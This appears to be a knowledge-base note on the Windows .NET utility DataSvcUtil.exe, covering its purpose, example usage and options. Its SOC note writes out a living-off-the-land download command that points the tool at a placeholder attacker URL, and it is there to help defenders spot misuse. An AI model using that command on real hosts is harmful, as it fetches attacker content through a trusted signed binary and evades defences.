---
created: 2026-11-21
fullpath: 'C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe'
generator:
  - claude
  - microsoftlearn
tags:
  - windows
  - executable
  - dotnet
aliases:
  - DataSvcUtil.exe
  - WCF Data Service Client Utility
url:
  - https://learn.microsoft.com/openspecs/sql_data_portability/ms-dpedmx/f60025f1-f153-4ad6-a7f7-e185566bd825
---

**fullpath**:C:\Windows\Microsoft.NET\Framework64\v3.5\DataSvcUtil.exe

# description

DataSvcUtil.exe is the WCF Data Services client utility that generates C# or Visual Basic client proxy classes from an Entity Data Model (.edmx) or a data service's metadata. It is provided with .NET Framework 3.5 SP1 / Visual Studio 2008 SP1. Related tools: Svcutil.exe, Visual Studio Add Service Reference.

## simple description

> ### 2026-11-21 Claude said
> DataSvcUtil.exe is a developer tool from the .NET Framework 3.5 that writes client code for talking to OData / WCF Data Services. Developers point it at a service URL or model file and it produces a .cs or .vb file. It is not used by normal users. It is present on many machines because .NET 3.5 is installed.
>
> **SOC NOTE**: Listed in LOLBAS as a download primitive (T1105): `DataSvcUtil /out:C:\path\file.cs /uri:https://attacker/...` fetches remote content via a signed Microsoft binary. Any execution with an external `/uri` on a non-developer host warrants investigation; check network connections and the output file.
>

# purpose

Generate client proxy classes from an .edmx file or data service so applications can consume WCF Data Services.

# typical use cases

| usage | description |
| --- | --- |
| `datasvcutil /in:filename.edmx /out:outputfilename.cs` | Generate C# client proxy classes from an .edmx file. |

# options

| option | description |
| --- | --- |
| `/in:<file>.edmx` | Input .edmx file from which client classes are generated. |
| `/out:<file>.cs` | Output file that receives the generated proxy classes. |
